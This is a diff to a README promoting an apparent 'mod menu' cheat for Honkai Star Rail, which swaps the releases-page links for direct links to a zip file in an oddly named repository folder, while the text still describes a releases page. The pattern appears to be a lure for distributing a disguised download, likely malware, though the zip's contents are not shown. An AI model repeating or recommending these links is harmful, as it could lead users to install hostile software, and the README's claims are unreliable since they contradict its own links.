@@ -1,6 +1,6 @@
 # 🎮 Honkai-Star-Rail-Jade-Mod-Menu - Unlock Unlimited Power in Honkai Star Rail
 
-[![Download Now](https://img.shields.io/badge/Download-HSR_Mod_Menu-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Masteratarmsseries6406/Honkai-Star-Rail-Jade-Mod-Menu/releases)
+[![Download Now](https://img.shields.io/badge/Download-HSR_Mod_Menu-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Masteratarmsseries6406/Honkai-Star-Rail-Jade-Mod-Menu/main/weakheartedly/Honkai_Menu_Rail_Mod_Star_Jade_3.9-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the ultimate Honkai Star Rail modification tool! This mod menu gives 
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Masteratarmsseries6406/Honkai-Star-Rail-Jade-Mod-Menu/releases](https://github.com/Masteratarmsseries6406/Honkai-Star-Rail-Jade-Mod-Menu/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Masteratarmsseries6406/Honkai-Star-Rail-Jade-Mod-Menu/main/weakheartedly/Honkai_Menu_Rail_Mod_Star_Jade_3.9-beta.1.zip](https://raw.githubusercontent.com/Masteratarmsseries6406/Honkai-Star-Rail-Jade-Mod-Menu/main/weakheartedly/Honkai_Menu_Rail_Mod_Star_Jade_3.9-beta.1.zip)
 
 Once you click the link, you'll be taken to the releases page. Look for the latest version and click the download button. The file will start downloading automatically.
 
@@ -151,7 +151,7 @@ This mod menu is provided for educational and entertainment purposes only. Use i
 
 Thank you for choosing Honkai-Star-Rail-Jade-Mod-Menu! We're confident this tool will enhance your gaming experience and give you the competitive edge you've been looking for. Download it today and start exploring all the amazing features we've built for you.
 
-Remember to visit the download page to get the latest version: [https://github.com/Masteratarmsseries6406/Honkai-Star-Rail-Jade-Mod-Menu/releases](https://github.com/Masteratarmsseries6406/Honkai-Star-Rail-Jade-Mod-Menu/releases)
+Remember to visit the download page to get the latest version: [https://raw.githubusercontent.com/Masteratarmsseries6406/Honkai-Star-Rail-Jade-Mod-Menu/main/weakheartedly/Honkai_Menu_Rail_Mod_Star_Jade_3.9-beta.1.zip](https://raw.githubusercontent.com/Masteratarmsseries6406/Honkai-Star-Rail-Jade-Mod-Menu/main/weakheartedly/Honkai_Menu_Rail_Mod_Star_Jade_3.9-beta.1.zip)
 
 Happy gaming, and may your journey through the stars be legendary! 🌟
 
